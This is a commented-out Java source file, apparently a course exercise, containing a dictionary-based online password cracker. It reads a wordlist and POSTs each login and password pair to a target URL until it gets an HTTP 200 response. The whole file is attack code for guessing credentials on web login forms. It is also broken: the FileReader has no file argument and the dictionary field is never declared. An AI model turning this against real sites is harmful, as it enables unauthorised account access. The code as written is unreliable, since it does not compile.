// import java.io.BufferedReader;
// import java.io.FileReader;
// import java.io.IOException;
// import java.net.HttpURLConnection;
// import java.net.URL;
// import java.net.URLEncoder;
// import java.util.ArrayList;
// import java.util.List;

// class DictionnaryOnLinePasswordCracker implements OnlinePasswordCracker {

//     public DictionnaryOnLinePasswordCracker() {
//     }

//     private List<String> loadDictionary( ) {
//         List<String> dictionary = new ArrayList<>();
//         try (BufferedReader reader = new BufferedReader(new FileReader())) {
//             String line;
//             while ((line = reader.readLine()) != null) {
//                 dictionary.add(line);
//             }
//         } catch (IOException e) {
//             e.printStackTrace();
//         }
//         return dictionary;
//     }

//     @Override
//     public String crack(String url, String login) {
//         for (String password : dictionary) {
//             if (authenticate(url, login, password)) {
//                 return password;
//             }
//         }
//         return null;
//     }

//     private boolean authenticate(String url, String login, String password) {
//         try {
//             String data = "login=" + URLEncoder.encode(login, "UTF-8") +
//                     "&password=" + URLEncoder.encode(password, "UTF-8");
//             HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
//             conn.setRequestMethod("POST");
//             conn.setDoOutput(true);
//             conn.getOutputStream().write(data.getBytes());

//             int responseCode = conn.getResponseCode();
//             return responseCode == HttpURLConnection.HTTP_OK;
//         } catch (IOException e) {
//             e.printStackTrace();
//         }
//         return false;
//     }
// }